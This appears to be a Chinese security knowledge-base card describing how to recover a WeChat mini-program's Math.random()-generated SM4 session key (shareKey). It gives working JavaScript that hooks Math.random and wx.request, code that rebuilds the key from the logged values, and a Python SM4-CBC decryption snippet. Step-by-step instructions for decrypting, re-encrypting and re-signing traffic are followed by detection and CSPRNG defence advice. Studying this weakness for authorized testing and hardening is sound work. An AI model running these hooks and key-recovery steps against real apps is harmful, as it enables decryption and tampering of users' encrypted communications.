---
id: crypto-prng-math-random-sharekey-recovery
title: Math.random 生成会话密钥的可预测性：小程序 32 位 shareKey 恢复
type: scenario
domain: crypto
path: crypto/prng
technique: math-random-session-key-recovery
aliases:
- Math.random 预测
- shareKey 恢复
- V8 XorShift128+
- 小程序密钥劫持
- 32 位随机十六进制密钥
- randomLog 重建密钥
tags:
- crypto
- prng
- javascript
- v8
- xorshift128
- wechat
- miniprogram
- key-recovery
- hook
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V66
  verified_at: '2026-11-05T12:19:23+08:00'
  notes: 已对照原文与图03/07核对：密钥生成 u() 为 32 次 Math.floor(Math.random()*16) 取 0123456789abcdef；hook Math.random + wx.request 记录 randomCallsAtRequest；取请求前最后 32 个值按 floor(v*16) 还原；原文 5000 条全量约36s、优化为末尾50候选<1s、候选#1、成功率~100% 均一致。卡内已明确边界（需能注入 JS，纯网络密文不可恢复）。PoC 为精简复现，未在本机执行。
---

## 一句话结论

小程序用 `Math.random()` 逐字符生成 32 位十六进制会话密钥（shareKey）时，密钥不是密码学随机数，而是 32 次可观测输出的确定性映射；在客户端 JS 上下文注入 hook 记录 `Math.random()` 返回值后，取请求前的最后 32 个值按 `floor(v*16)` 还原，即可完整恢复 shareKey，进而解密和重加密全部通信。

## 原理

- 目标密钥生成逻辑：`for (i=0;i<32;i++) key += "0123456789abcdef"[Math.floor(Math.random()*16)]`，即 32 个十六进制字符（16 字节），直接作为 SM4 密钥。
- V8 的 `Math.random()` 使用 XorShift128+ 一类非密码学 PRNG，输出可预测、不可作为密钥材料；更关键的是，密钥的每一位都由一个可被同进程 JS hook 观测到的 `Math.random()` 返回值唯一决定，没有引入任何服务端随机数或密码学熵。
- 因此攻击者只要能控制/观测客户端运行时（例如通过微信开发者工具 CDP/MCP 向 appservice 注入 JS），记录每次 `Math.random()` 的返回值，就能在请求发生时取"该请求之前的最后 32 次调用"，用 `Math.floor(val*16)` 映射回十六进制字符，重建 shareKey。
- 为什么成立：客户端自己生成密钥并用 SM2 公钥加密后随请求发送，服务端必须能恢复它；密钥的生成过程完全在客户端、完全由 `Math.random()` 决定，没有任何防篡改或远端熵。hook 只是把"客户端本来就知道的密钥"读出来。
- 边界：该恢复方法依赖能在目标 JS 上下文执行 hook（授权测试中的开发者工具/CDP、或已控制客户端）；仅有网络密文而没有 hook 能力时，不能直接恢复 shareKey。若实现改用 `crypto.getRandomValues()`/`wx.getRandomValues()` 等 CSPRNG，则本方法失效。

## 触发条件

- 客户端 JS 使用 `Math.random()` 生成会话密钥/IV/签名 nonce 等安全敏感值。
- 攻击者可对小程序 appservice 上下文注入 JS（微信开发者工具 CDP、MCP SSE 端点，或等价动态调试能力）。
- 能定位密钥生成函数与请求发送时机（webpack 模块分析或运行时 hook `wx.request`）。
- 密钥长度和字符集固定，且由连续的 `Math.random()` 调用生成。

## 利用步骤

1. 反编译/调试客户端，定位密钥生成函数（本文为 webpack 模块 63 中的 `u()`：32 次 `Math.random()` 取 `0123456789abcdef` 的字符）。
2. 注入双重 hook：包装 `Math.random()` 记录每次返回值；包装 `wx.request` 记录请求发出时的累计调用次数 `randomCallsAtRequest`。
3. 触发一次业务请求，读取日志中该请求之前的最后 32 个 random 值。
4. 对每个值计算 `idx = Math.floor(v * 16)`，按字符集 `0123456789abcdef` 取字符，拼接得到 32 位 shareKey。
5. 用 shareKey 对请求 `data` 做 SM4-CBC 解密验证；成功即恢复正确。
6. 优化：不要全量扫描日志（5000 条约 36 秒），从末尾向前只取最后 50 个候选，通常第一个就命中，耗时 <1 秒。
7. 后续可用该 shareKey 解密响应、重加密修改后的请求并重算 SM3 签名（见 [[mobile-miniprogram-sm-crypto-protocol-burp-transparent]]）。

## PoC

注入 hook（小程序 appservice 上下文）：

```javascript
(function () {
  if (globalThis.__hookState && globalThis.__hookState.initialized) return 'ok';
  var state = {
    totalCalls: 0, logIndex: 0, maxLog: 5000,
    randomLog: [], capturedRequest: null, initialized: true
  };
  var origRandom = Math.random;
  var origRequest = wx.request;

  Math.random = function () {
    var val = origRandom();
    state.randomLog[state.logIndex % state.maxLog] = val;
    state.logIndex++;
    state.totalCalls++;
    return val;
  };

  Object.defineProperty(wx, 'request', {
    configurable: true, enumerable: true, writable: true,
    value: function (options) {
      state.capturedRequest = {
        url: options.url, method: options.method, data: options.data,
        header: options.header, time: Date.now(),
        randomCallsAtRequest: state.totalCalls
      };
      return origRequest.call(this, options);
    }
  });

  globalThis.__hookState = state;
  return 'ok';
})();
```

从日志恢复 shareKey：

```javascript
// 取该请求之前的最后 32 次 Math.random() 返回值
const n = state.capturedRequest.randomCallsAtRequest;
const vals = [];
for (let i = n - 32; i < n; i++) {
  vals.push(state.randomLog[i % state.maxLog]);
}
const alphabet = "0123456789abcdef";
const shareKey = vals.map(v => alphabet[Math.floor(v * 16)]).join('');
// shareKey 即 32 位十六进制字符串，可直接作为 SM4 密钥
```

```python
# 恢复后的密钥直接用于 SM4-CBC 解密（gmssl）
key = bytes.fromhex(shareKey)
iv = bytes.fromhex(iv_hex)
crypt = CryptSM4()
crypt.set_key(key, SM4_DECRYPT)
plaintext = crypt.crypt_cbc(iv, bytes.fromhex(data_hex))
```

说明：PoC 为原文方法的精简复现，未在本机执行；hook 仅用于授权测试环境。

## 变体与关联

- 变体：`Math.random()` 还被用于生成 IV、nonce、验证码、重置令牌等；同一 hook 思路可恢复这些值。
- 变体：若无法注入 hook，但能获得同一 PRNG 的连续输出（如其他接口泄露随机值），可尝试 XorShift128+ 状态恢复来预测后续输出；难度和前提更高。
- 变体：其他语言/运行时的弱 PRNG（MT19937、`rand()`、时间种子）可用各自的种子/状态恢复方法，思路相同：密钥由可预测输出决定。
- 关联：[[mobile-miniprogram-sm-crypto-protocol-burp-transparent]]（完整小程序国密协议逆向与 Burp 透明加解密）；[[crypto-implementation-gmssl-sm2-publickey-lstrip-hex-case]]（SM2/SM3 复现时的实现坑点）。
- 边界：使用 CSPRNG、密钥由服务端下发、或有防调试/完整性校验阻止 hook 时，本方法不成立。

## 检测与防御

- 检测：客户端代码中出现 `Math.random()` 参与密钥/IV/nonce/签名的模式；同一密钥在多次请求中呈现可预测的字符分布。
- 防御：所有安全敏感随机值使用 `crypto.getRandomValues()`/`wx.getRandomValues()` 等 CSPRNG；密钥由服务端生成并绑定会话；不要在客户端用 PRNG 直接派生加密密钥。
- 加固：对客户端 JS 做完整性校验与反调试只能提高门槛，不能替代 CSPRNG；服务端增加重放/频率校验，缩短会话密钥生命周期。

